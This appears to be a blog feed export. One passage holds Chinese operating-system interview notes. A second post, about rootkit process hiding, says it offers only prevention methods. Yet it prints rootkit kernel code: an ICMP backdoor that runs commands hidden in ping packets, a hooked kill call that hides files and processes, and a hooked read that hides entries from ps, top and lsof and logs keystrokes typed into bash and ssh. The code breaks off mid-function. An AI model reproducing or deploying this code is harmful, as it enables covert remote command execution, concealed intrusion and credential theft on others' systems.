每个进程中访问临界资源的那段程序称为临界区，每次只准许一个进程进入临界区，进入后不允许其他进程进入。</div><div class="line"></div><div class="line">　　（1）如果有若干进程要求进入空闲的临界区，一次仅允许一个进程进入；</div><div class="line"></div><div class="line">　　（2）任何时候，处于临界区内的进程不可多于一个。如已有进程进入自己的临界区，则其它所有试图进入临界区的进程必须等待；</div><div class="line"></div><div class="line">　　（3）进入临界区的进程要在有限时间内退出，以便其它进程能及时进入自己的临界区；</div><div class="line"></div><div class="line">　　（4）如果进程不能进入自己的临界区，则应让出CPU，避免进程出现“忙等”现象。</div><div class="line"></div><div class="line">　　7、说说分段和分页</div><div class="line"></div><div class="line">　　页是信息的物理单位，分页是为实现离散分配方式，以消减内存的外零头，提高内存的利用率；或者说，分页仅仅是由于系统管理的需要，而不是用户的需要。</div><div class="line"></div><div class="line">　　段是信息的逻辑单位，它含有一组其意义相对完整的信息。分段的目的是为了能更好的满足用户的需要。</div><div class="line"></div><div class="line">　　页的大小固定且由系统确定，把逻辑地址划分为页号和页内地址两部分，是由机器硬件实现的，因而一个系统只能有一种大小的页面。段的长度却不固定，决定于用户所编写的程序，通常由编辑程序在对源程序进行编辑时，根据信息的性质来划分。</div><div class="line"></div><div class="line">　　分页的作业地址空间是一维的，即单一的线性空间，程序员只须利用一个记忆符，即可表示一地址。分段的作业地址空间是二维的，程序员在标识一个地址时，既需给出段名，又需给出段内地址。</div><div class="line"></div><div class="line">　　8、说出你所知道的保持进程同步的方法？</div><div class="line"></div><div class="line">　　进程间同步的主要方法有原子操作、信号量机制、自旋锁、管程、会合、分布式系统等。</div><div class="line"></div><div class="line">　　9、Linux中常用到的命令</div><div class="line"></div><div class="line">　　显示文件目录命令ls        如ls</div><div class="line"></div><div class="line">　　改变当前目录命令<span class="built_in">cd</span>        如<span class="built_in">cd</span> /home</div><div class="line"></div><div class="line">　　建立子目录mkdir           如mkdir xiong</div><div class="line"></div><div class="line">　　删除子目录命令rmdir       如rmdir /mnt/cdrom</div><div class="line"></div><div class="line">　　删除文件命令rm            如rm /ucdos.bat</div><div class="line"></div><div class="line">　　文件复制命令cp            如cp /ucdos /fox</div><div class="line"></div><div class="line">　　获取帮助信息命令man      如man ls</div><div class="line"></div><div class="line">　　显示文件的内容less        如less mwm.lx</div><div class="line"></div><div class="line">　　重定向与管道<span class="built_in">type</span>          如<span class="built_in">type</span> readme&gt;&gt;direct，将文件readme的内容追加到文direct中</div><div class="line"></div><div class="line">10、Linux文件属性有哪些？（共十位）</div><div class="line"></div><div class="line">　　-rw-r--r--那个是权限符号，总共是- --- --- ---这几个位。</div><div class="line"></div><div class="line">　　第一个短横处是文件类型识别符：-表示普通文件；c表示字符设备（character）；b表示块设备（block）；d表示目录（directory）；l表示链接文件（link）；后面第一个三个连续的短横是用户权限位（User），第二个三个连续短横是组权限位（Group），第三个三个连续短横是其他权限位（Other）。每个权限位有三个权限，r（读权限），w（写权限），x（执行权限）。如果每个权限位都有权限存在，那么满权限的情况就是：-rwxrwxrwx；权限为空的情况就是- --- --- ---。</div><div class="line"></div><div class="line">　　权限的设定可以用chmod命令，其格式位：chmod ugoa+/-/=rwx filename/directory。例如：</div><div class="line"></div><div class="line">　　一个文件aaa具有完全空的权限- --- --- ---。</div><div class="line"></div><div class="line">　　chmod u+rw aaa（给用户权限位设置读写权限，其权限表示为：- rw- --- ---）</div><div class="line"></div><div class="line">　　chmod g+r aaa（给组设置权限为可读，其权限表示为：- --- r-- ---）</div><div class="line"></div><div class="line">　　chmod ugo+rw aaa（给用户，组，其它用户或组设置权限为读写，权限表示为：- rw- rw- rw-）</div><div class="line"></div><div class="line">　　如果aaa具有满权限- rwx rwx rwx。</div><div class="line"></div><div class="line">　　chmod u-x aaa（去掉用户可执行权限，权限表示为：- rw- rwx rwx）</div><div class="line"></div><div class="line">　　如果要给aaa赋予制定权限- rwx r-x r-x，命令为：</div><div class="line"></div><div class="line">　　chmod u=rwx，go=rx aaa</div><div class="line"></div><div class="line">　　11、makefile文件的作用是什么？</div><div class="line"></div><div class="line">　　一个工程中的源文件不计其数，其按类型、功能、模块分别放在若干个目录中。makefile定义了一系列的规则来指定哪些文件需要先编译，哪些文件需要后编译，哪些文件需要重新编译，甚至于进行更复杂的功能操作。因为makefile就像一个Shell脚本一样，其中也可以执行操作系统的命令。makefile带来的好处就是——“自动化编译”。一旦写好，只需要一个make命令，整个工程完全自动编译，极大地提高了软件开发的效率。make是一个命令工具，是一个解释makefile中指令的命令工具。一般来说，大多数的IDE都有这个命令，比如：Delphi的make，Visual C++的nmake，Linux下GNU的make。可见，makefile都成为了一种在工程方面的编译方法。</div><div class="line"></div><div class="line">　　12、简术OSI的物理层Layer1，链路层Layer2，网络层Layer3的任务。</div><div class="line"></div><div class="line">　　网络层：通过路由选择算法，为报文或分组通过通信子网选择最适当的路径。</div><div class="line"></div><div class="line">　　链路层：通过各种控制协议，将有差错的物理信道变为无差错的、能可靠传输数据帧的数据链路。</div><div class="line"></div><div class="line">　　物理层：利用传输介质为数据链路层提供物理连接，实现比特流的透明传输。</div><div class="line"></div><div class="line">　　13、什么是中断？中断时CPU做什么工作？</div><div class="line"></div><div class="line">　　中断是指在计算机执行期间，系统内发生任何非寻常的或非预期的急需处理事件，使得CPU暂时中断当前正在执行的程序而转去执行相应的事件处理程序。待处理完毕后又返回原来被中断处继续执行或调度新的进程执行的过程。</div><div class="line"></div><div class="line">　　14、你知道操作系统的内容分为几块吗？什么叫做虚拟内存？他和主存的关系如何？内存管理属于操作系统的内容吗？</div><div class="line"></div><div class="line">　　操作系统的主要组成部分：进程和线程的管理，存储管理，设备管理，文件管理。虚拟内存是一些系统页文件，存放在磁盘上，每个系统页文件大小为4K，物理内存也被分页，每个页大小也为4K，这样虚拟页文件和物理内存页就可以对应，实际上虚拟内存就是用于物理内存的临时存放的磁盘空间。页文件就是内存页，物理内存中每页叫物理页，磁盘上的页文件叫虚拟页，物理页+虚拟页就是系统所有使用的页文件的总和。</div><div class="line"></div><div class="line">15、线程是否具有相同的堆栈？dll是否有独立的堆栈？</div><div class="line"></div><div class="line">　　每个线程有自己的堆栈。</div><div class="line"></div><div class="line">　　dll是否有独立的堆栈？这个问题不好回答，或者说这个问题本身是否有问题。因为dll中的代码是被某些线程所执行，只有线程拥有堆栈。如果dll中的代码是exe中的线程所调用，那么这个时候是不是说这个dll没有独立的堆栈？如果dll中的代码是由dll自己创建的线程所执行，那么是不是说dll有独立的堆栈？</div><div class="line"></div><div class="line">　　以上讲的是堆栈，如果对于堆来说，每个dll有自己的堆，所以如果是从dll中动态分配的内存，最好是从dll中删除；如果你从dll中分配内存，然后在exe中，或者另外一个dll中删除，很有可能导致程序崩溃。</div><div class="line"></div><div class="line">　　16、什么是缓冲区溢出？有什么危害？其原因是什么？</div><div class="line"></div><div class="line">　　缓冲区溢出是指当计算机向缓冲区内填充数据时超过了缓冲区本身的容量，溢出的数据覆盖在合法数据上。</div><div class="line"></div><div class="line">　　危害：在当前网络与分布式系统安全中，被广泛利用的50%以上都是缓冲区溢出，其中最著名的例子是1988年利用fingerd漏洞的蠕虫。而缓冲区溢出中，最为危险的是堆栈溢出，因为入侵者可以利用堆栈溢出，在函数返回时改变返回程序的地址，让其跳转到任意地址，带来的危害一种是程序崩溃导致拒绝服务，另外一种就是跳转并且执行一段恶意代码，比如得到shell，然后为所欲为。通过往程序的缓冲区写超出其长度的内容，造成缓冲区的溢出，从而破坏程序的堆栈，使程序转而执行其它指令，以达到攻击的目的。</div><div class="line"></div><div class="line">　　造成缓冲区溢出的主原因是程序中没有仔细检查用户输入的参数。</div><div class="line"></div><div class="line">　　17、什么是死锁？其条件是什么？怎样避免死锁？</div><div class="line"></div><div class="line">　　死锁的概念：在两个或多个并发进程中，如果每个进程持有某种资源而又都等待别的进程释放它或它们现在保持着的资源，在未改变这种状态之前都不能向前推进，称这一组进程产生了死锁。通俗地讲，就是两个或多个进程被无限期地阻塞、相互等待的一种状态。</div><div class="line"></div><div class="line">　　死锁产生的原因主要是：？ 系统资源不足；？ 进程推进顺序非法。</div><div class="line"></div><div class="line">　　产生死锁的必要条件：</div><div class="line"></div><div class="line">　　（1）互斥（mutualexclusion），一个资源每次只能被一个进程使用；</div><div class="line"></div><div class="line">　　（2）不可抢占（nopreemption），进程已获得的资源，在未使用完之前，不能强行剥夺；</div><div class="line"></div><div class="line">　　（3）占有并等待（hold andwait），一个进程因请求资源而阻塞时，对已获得的资源保持不放；</div><div class="line"></div><div class="line">　　（4）环形等待（circularwait），若干进程之间形成一种首尾相接的循环等待资源关系。</div><div class="line"></div><div class="line">　　这四个条件是死锁的必要条件，只要系统发生死锁，这些条件必然成立，而只要上述条件之一不满足，就不会发生死锁。</div><div class="line"></div><div class="line">　　死锁的解除与预防：理解了死锁的原因，尤其是产生死锁的四个必要条件，就可以最大可能地避免、预防和解除死锁。所以，在系统设计、进程调度等方面注意如何不让这四个必要条件成立，如何确定资源的合理分配算法，避免进程永久占据系统资源。此外，也要防止进程在处于等待状态的情况下占用资源。因此，对资源的分配要给予合理的规划。</div><div class="line"></div><div class="line">　　死锁的处理策略：鸵鸟策略、预防策略、避免策略、检测与恢复策略。</div><div class="line"></div><div class="line">　1、程序和进程</div><div class="line"></div><div class="line">　　进程由两个部分组成：1）操作系统用来管理进程的内核对象。内核对象也是系统用来存放关于进程的统计信息的地方。2）地址空间。它包含所有可执行模块或DLL模块的代码和数据。它还包含动态内存分配的空间。如线程堆栈和堆分配空间。</div></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="external">Writing</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;The OS summary!The OS summary!The OS summary!The OS summary!&lt;/p&gt;
&lt;h2 id=&quot;The-OS-summary&quot;&gt;&lt;a href=&quot;#The-OS-summary&quot; class=&quot;headerlink&quot; tit
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>The study of how to solve rookitd record!</title>
    <link href="http://yoursite.com/2017/09/23/new7/"/>
    <id>http://yoursite.com/2017/09/23/new7/</id>
    <published>2017-09-23T10:52:34.421Z</published>
    <updated>2017-09-23T10:55:22.973Z</updated>
    
    <content type="html"><![CDATA[<p>First define an array of 64 elements that need to hide the process prefix [MAX_PREFIX]<br>Then define a filldir hook () function (ps: first, vfs_readir callback function (exact should be called filldir_t filler);<br>Second, sys_getdents is passed to the callback function of vfs_readdir.<br>filldir_t filler is in the various vfs_readir internal callback, by the various fs internal read_dir implementation to complete the directory traversal operation,<br>For each file or subdirectory traversed, callback filler to fill buf) hook the process callback function fill value, when the fill value is equal to the hidden<br>The process number of the stored process (ps: the process character name is converted to a corresponding integer by the kstrtouint () function).<br>prefix [MAX_PREFIX].<br>Finally, in the need to hide the main function of the process in order to scan prefix [MAX_PREFIX], when the scan is not 0 when the value of the process is that we<br>Need to hide the process, return directly, do not return to the buffer. If it is 0, then we do not need to hide the process is not necessary to hide<br>Possession of the process, to the real <code>filldir</code> fill in the buffer.</p><p>Ps: Since the process is always created by the parent process, and the child process can create a child process, so the process is a tree, and rootkid through the hook function<br>Make the rootkid want to hide the process by the system call readir function callback function does not return to the process buffer, in fact, is a broken tree<br>Bad, making the real system process tree becomes incomplete</p><p>because someone will use this way to attack the others ,I only give the Prevention method to who is interested in this!!!</p><h2 id="The-first-situation"><a href="#The-first-situation" class="headerlink" title="The first situation"></a>The first situation</h2><h3 id="How-to-find-hidden-process"><a href="#How-to-find-hidden-process" class="headerlink" title="How to find hidden process"></a>How to find hidden process</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div></pre></td><td class="code"><pre><div class="line">/* execute cmds hidden <span class="keyword">in</span> icmp <span class="built_in">echo</span> packet */</div><div class="line">unsigned int icmp_hook(</div><div class="line"><span class="comment">#if LINUX_VERSION_CODE &lt; KERNEL_VERSION(3,13,0)</span></div><div class="line">        unsigned int hooknum,</div><div class="line"><span class="comment">#else</span></div><div class="line">        const struct nf_hook_ops *ops,</div><div class="line"><span class="comment">#endif</span></div><div class="line">        struct sk_buff *skb,</div><div class="line">        const struct net_device *<span class="keyword">in</span>,</div><div class="line">        const struct net_device *out,</div><div class="line">        int (*okfn)(struct sk_buff *))</div><div class="line">&#123;</div><div class="line">    struct icmphdr *icmph;</div><div class="line">    struct iphdr   *iph;</div><div class="line">    char *data, *cmd;</div><div class="line">    int cmdlen, passlen;</div><div class="line"></div><div class="line">    icmph = icmp_hdr(skb);</div><div class="line">    data = (char *)icmph + 8;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (icmph &amp;&amp; icmph-&gt;<span class="built_in">type</span> == ICMP_ECHO &amp;&amp;</div><div class="line">            !strncmp(rce_pass, data, passlen=strlen(rce_pass))) &#123;</div><div class="line"></div><div class="line">        /* get ip header */</div><div class="line">        iph = ip_hdr(skb);</div><div class="line"></div><div class="line">        /* calculate cmd length */</div><div class="line">        cmdlen = __be16_to_cpu(iph-&gt;tot_len) - iph-&gt;ihl * 4</div><div class="line">            - /*icmp header*/ 8 - passlen - /*space after password*/ 1;</div><div class="line">        FDEBUG(<span class="string">"total len: %d\theader len: %d\tpasslen: %d\n"</span>,</div><div class="line">                __be16_to_cpu(iph-&gt;tot_len), iph-&gt;ihl, passlen);</div><div class="line"></div><div class="line">        /* get cmd string */</div><div class="line">        cmd = rce_cmd;</div><div class="line">        memcpy(cmd, data+passlen+1, cmdlen);</div><div class="line">        cmd[cmdlen] = <span class="string">'\0'</span>;</div><div class="line">        argv[2] = cmd;</div><div class="line"></div><div class="line">        FDEBUG(<span class="string">"Cmd (%d bytes): %s\n"</span>, cmdlen, cmd);</div><div class="line">        </div><div class="line">        /* start userspace <span class="built_in">command</span> */</div><div class="line">        call_usermodehelper(argv[0], argv, NULL, UMH_NO_WAIT);</div><div class="line"></div><div class="line">        goto drop;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="built_in">return</span> NF_ACCEPT;</div><div class="line"></div><div class="line">drop:</div><div class="line">    <span class="built_in">return</span> NF_DROP;</div><div class="line">&#125;</div><div class="line"></div><div class="line">/* netfilter hook struct */</div><div class="line">struct nf_hook_ops nfhook = &#123;</div><div class="line">    .owner      = THIS_MODULE,</div><div class="line">    .hook       = icmp_hook,</div><div class="line">    .pf         = PF_INET,</div><div class="line">    .hooknum    = NF_INET_LOCAL_IN,</div><div class="line">    .priority   = NF_IP_PRI_FIRST,</div><div class="line">&#125;;</div><div class="line"></div><div class="line">int rce_init(void)</div><div class="line">&#123;</div><div class="line">    <span class="built_in">return</span> nf_register_hook(&amp;nfhook);</div><div class="line">&#125;</div><div class="line"></div><div class="line">void rce_exit(void)</div><div class="line">&#123;</div><div class="line">    nf_unregister_hook(&amp;nfhook);</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">/***********************</div><div class="line"> * rootkit control</div><div class="line"> ***********************/</div><div class="line"></div><div class="line">/* <span class="built_in">kill</span> hook */</div><div class="line">asmlinkage long sys_kill(pid_t pid, int sig)</div><div class="line">&#123;</div><div class="line">    switch (sig) &#123;</div><div class="line">        <span class="keyword">case</span> SIGRTMAX:  /* rootkit control */</div><div class="line">            switch (pid) &#123;</div><div class="line">                <span class="keyword">case</span> 0:</div><div class="line">                    file_hide_start();</div><div class="line">                    <span class="built_in">break</span>;</div><div class="line"></div><div class="line">                <span class="keyword">case</span> 1:</div><div class="line">                    file_hide_stop();</div><div class="line">                    <span class="built_in">break</span>;</div><div class="line">            &#125;</div><div class="line">            <span class="built_in">break</span>;</div><div class="line"></div><div class="line">        <span class="keyword">case</span> SIGRTMAX-1:  /* hide process */</div><div class="line">            <span class="keyword">if</span> (pid == 0)</div><div class="line">                reveal_all_pids();</div><div class="line">            <span class="keyword">else</span></div><div class="line">                hide_pid(pid);</div><div class="line">            <span class="built_in">break</span>;</div><div class="line"></div><div class="line">        default:</div><div class="line">            <span class="built_in">return</span> ((asmlinkage long (*)(pid_t, int))old_kill)(pid, sig);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="built_in">return</span> 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>Welcome to communicate: <a href="https://762131828@qq.com" target="_blank" rel="external">Server</a></p><h2 id="The-second-situation"><a href="#The-second-situation" class="headerlink" title="The second situation"></a>The second situation</h2><h3 id="Change-the-system’ps-and-pstree"><a href="#Change-the-system’ps-and-pstree" class="headerlink" title="Change the system’ps and pstree!"></a>Change the system’ps and pstree!</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div><div class="line">231</div></pre></td><td class="code"><pre><div class="line">inkage int h4x_read(unsigned int fd, char __user *buf, size_t count)</div><div class="line">&#123;</div><div class="line">  int i,r;</div><div class="line">  char date_time[24];</div><div class="line">  char *kbuf=(char*)kmalloc(256,GFP_KERNEL);</div><div class="line"></div><div class="line">  /*If output is redirected to file or grep, hide it*/</div><div class="line">  copy_from_user(kbuf,buf,255);</div><div class="line">  <span class="keyword">if</span> ((strstr(current-&gt;comm,<span class="string">"ps"</span>))||(strstr(current-&gt;comm,<span class="string">"pstree"</span>))||</div><div class="line">      (strstr(current-&gt;comm,<span class="string">"top"</span>))||(strstr(current-&gt;comm,<span class="string">"lsof"</span>)))&#123;</div><div class="line">    <span class="keyword">if</span>(strstr(kbuf,_H4X0R_)||strstr(kbuf,KBEAST))</div><div class="line">    &#123;</div><div class="line">      kfree(kbuf);</div><div class="line">      <span class="built_in">return</span> -ENOENT;</div><div class="line">    &#125;</div><div class="line">  &#125; </div><div class="line"> </div><div class="line">  r=o_read(fd,buf,count);</div><div class="line">  /*Due to stability issue, we <span class="built_in">limit</span> the keylogging process*/</div><div class="line">  <span class="keyword">if</span>((strcmp(current-&gt;comm,<span class="string">"bash"</span>) == 0) || (strcmp(current-&gt;comm,<span class="string">"ssh"</span>) == 0)||</div><div class="line">     (strcmp(current-&gt;comm,<span class="string">"scp"</span>) == 0) || (strcmp(current-&gt;comm,<span class="string">"telnet"</span>) == 0)||</div><div class="line">     (strcmp(current-&gt;comm,<span class="string">"rsh"</span>) == 0) || (strcmp(current-&gt;comm,<span class="string">"rlogin"</span>) == 0))&#123;    </div><div class="line">    /*SPECIAL CHAR*/</div><div class="line">    <span class="keyword">if</span> (counter) &#123;</div><div class="line">      <span class="keyword">if</span> (counter == 2) &#123;  // Arrows + Break</div><div class="line">        //left arrow</div><div class="line">        <span class="keyword">if</span> (buf[0] == 0x44) &#123;</div><div class="line">          strcat(ibuffer,<span class="string">"[LEFT]"</span>);</div><div class="line">          counter = 0;</div><div class="line">          goto END;</div><div class="line">        &#125;</div><div class="line">        //right arrow</div><div class="line">        <span class="keyword">if</span> (buf[0] == 0x43) &#123;</div><div class="line">          strcat(ibuffer,<span class="string">"[RIGHT]"</span>);</div><div class="line">          counter = 0;</div><div class="line">          goto END;</div><div class="line">        &#125;</div><div class="line">        //up arrow</div><div class="line">        <span class="keyword">if</span> (buf[0] == 0x41) &#123;</div><div class="line">          strcat(ibuffer,<span class="string">"[UP]"</span>);</div><div class="line">          counter = 0;</div><div class="line">          goto END;</div><div class="line">        &#125;</div><div class="line">        //down arrow</div><div class="line">        <span class="keyword">if</span> (buf[0] == 0x42) &#123;</div><div class="line">          strcat(ibuffer,<span class="string">"[DOWN]"</span>);</div><div class="line">          counter = 0;</div><div class="line">          goto END;</div><div class="line">        &#125;</div><div class="line">        //<span class="built_in">break</span></div><div class="line">        <span class="keyword">if</span> (buf[0] == 0x50) &#123;</div><div class="line">  strcat(ibuffer,<span class="string">"[BREAK]"</span>);</div><div class="line">  counter = 0;</div><div class="line">          goto END;</div><div class="line">        &#125;</div><div class="line">        //numlock</div><div class="line">        <span class="keyword">if</span>(buf[0] == 0x47) &#123;</div><div class="line">  strcat (ibuffer,<span class="string">"[NUMLOCK]"</span>);</div><div class="line">  counter = 0;</div><div class="line">          goto END;</div><div class="line">        &#125;</div><div class="line">        strncpy (spbuffer,buf,1);</div><div class="line">        counter ++;</div><div class="line">        goto END;</div><div class="line">      &#125;</div><div class="line">  </div><div class="line">      <span class="keyword">if</span> (counter == 3) &#123;   // F1-F5</div><div class="line">        //F1</div><div class="line">        <span class="keyword">if</span> (buf[0] == 0x41) &#123;</div><div class="line">          strcat(ibuffer,<span class="string">"[F1]"</span>);</div><div class="line">          counter = 0;</div><div class="line">          goto END;</div><div class="line">        &#125;</div><div class="line">        //F2</div><div class="line">        <span class="keyword">if</span> (buf[0] == 0x42) &#123;</div><div class="line">          strcat(ibuffer,<span class="string">"[F2]"</span>);</div><div class="line">          counter = 0;</div><div class="line">          goto END;</div><div class="line">        &#125;</div><div class="line">        //F3</div><div class="line">        <span class="keyword">if</span> (buf[0] == 0x43) &#123;</div><div class="line">          strcat(ibuffer,<span class="string">"[F3]"</span>);</div><div class="line">          counter = 0;</div><div class="line">          goto END;</div><div class="line">        &#125;</div><div class="line">        //F4</div><div class="line">        <span class="keyword">if</span> (buf[0] == 0x44) &#123;</div><div class="line">          strcat(ibuffer,<span class="string">"[F4]"</span>);</div><div class="line">          counter = 0;</div><div class="line">          goto END;</div><div class="line">        &#125;</div><div class="line">        //F5</div><div class="line">        <span class="keyword">if</span> (buf[0] == 0x45) &#123;</div><div class="line">          strcat(ibuffer,<span class="string">"[F5]"</span>);</div><div class="line">          counter = 0;</div><div class="line">          goto END;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (buf[0] == 0x7E) &#123;     // PgUp, PgDown, Ins, ...</div><div class="line">          //Page Up</div><div class="line">          <span class="keyword">if</span> (spbuffer[0] == 0x35)</div><div class="line">            strcat(ibuffer,<span class="string">"[PGUP]"</span>);</div><div class="line">          //Page Down</div><div class="line">          <span class="keyword">if</span> (spbuffer[0] == 0x36)</div><div class="line">            strcat(ibuffer,<span class="string">"[PGDN]"</span>);</div><div class="line">          //Delete</div><div class="line">          <span class="keyword">if</span> (spbuffer[0] == 0x33)</div><div class="line">            strcat(ibuffer,<span class="string">"[DELETE]"</span>);</div><div class="line">          //End</div><div class="line">          <span class="keyword">if</span> (spbuffer[0] == 0x34)</div><div class="line">            strcat(ibuffer,<span class="string">"[END]"</span>);</div><div class="line">          //Home</div><div class="line">          <span class="keyword">if</span> (spbuffer[0] == 0x31)</div><div class="line">            strcat(ibuffer,<span class="string">"[HOME]"</span>);</div><div class="line">          //Insert</div><div class="line">          <span class="keyword">if</span> (spbuffer[0] == 0x32)</div><div class="line">            strcat(ibuffer,<span class="string">"[INSERT]"</span>);</div><div class="line">          counter = 0;</div><div class="line">          goto END;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (spbuffer[0] == 0x31) &#123;  // F6-F8</div><div class="line">          //F6</div><div class="line">          <span class="keyword">if</span> (buf[0] == 0x37)</div><div class="line">            strcat(ibuffer,<span class="string">"[F6]"</span>);</div><div class="line">          //F7</div><div class="line">          <span class="keyword">if</span> (buf[0] == 0x38)</div><div class="line">            strcat(ibuffer,<span class="string">"[F7]"</span>);</div><div class="line">          //F8</div><div class="line">          <span class="keyword">if</span> (buf[0] == 0x39)</div><div class="line">            strcat(ibuffer,<span class="string">"[F8]"</span>);</div><div class="line">          counter++;</div><div class="line">          goto END;</div><div class="line">        &#125;</div><div class="line">  </div><div class="line">        <span class="keyword">if</span> (spbuffer[0] == 0x32) &#123; // F9-F12</div><div class="line">          //F9</div><div class="line">          <span class="keyword">if</span> (buf[0] == 0x30)</div><div class="line">            strcat(ibuffer,<span class="string">"[F9]"</span>);</div><div class="line">          //F10</div><div class="line">          <span class="keyword">if</span> (buf[0] == 0x31)</div><div class="line">            strcat(ibuffer,<span class="string">"[F10]"</span>);</div><div class="line">          //F11</div><div class="line">          <span class="keyword">if</span> (buf[0] == 0x33)</div><div class="line">            